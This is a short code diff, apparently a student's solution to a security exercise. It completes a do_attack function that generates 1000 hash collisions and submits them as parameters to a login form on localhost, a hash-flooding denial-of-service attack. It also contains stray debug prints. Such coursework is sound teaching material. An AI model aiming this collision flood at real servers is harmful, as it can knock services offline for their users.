@@ -1,4 +1,5 @@
 from requests import codes, Session
+from collisions import find_collisions
 
 LOGIN_FORM_URL = "http://localhost:8080/login"
 
@@ -18,11 +19,19 @@ def do_login_form(sess, username,password,params=None):
 def do_attack():
 	sess = Session()
   #Choose any valid username and password
-	uname =""
-	pw = ""
+	uname ="victim"
+	pw = "victim"
   #Put your colliding inputs in this dictionary as parameters.
-	attack_dict = {}
+
+	# find 1000 collisions
+	key = b'\x00'*16
+	collisions_1000 = find_collisions(key, 1000)
+	print("test")
+	attack_dict = {
+		c: i for i, c in enumerate(collisions_1000)
+	}
 	response = do_login_form(sess, uname,pw,attack_dict)
+	print("bruh")
 
 
 if __name__=='__main__':
